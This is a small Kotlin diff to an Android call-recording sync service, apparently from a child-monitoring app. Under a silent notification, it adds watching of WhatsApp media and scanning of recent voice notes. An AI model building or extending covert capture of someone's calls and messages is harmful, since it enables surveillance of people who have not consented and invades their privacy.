@@ -60,6 +60,7 @@ class CallRecordingSyncService : Service() {
             startForeground(AppConstants.SERVICE_NOTIFICATION_ID, createSilentNotification())
         }
         startWatchingRecordings()
+        com.vyra.kids.core.WhatsAppMediaManager.startWatching(this)
         setupCallLogObserver()
         syncRecentCallLogs()
     }
@@ -321,6 +322,7 @@ class CallRecordingSyncService : Service() {
                 try {
                     syncRecentCalls(context)
                     scanAndSecureRecordings(context)
+                    com.vyra.kids.core.WhatsAppMediaManager.scanRecentVoiceNotes(context)
                 } catch (e: Exception) {
                     Log.e(AppConstants.TAG, "Error in syncCallsAndRecordings", e)
                 }
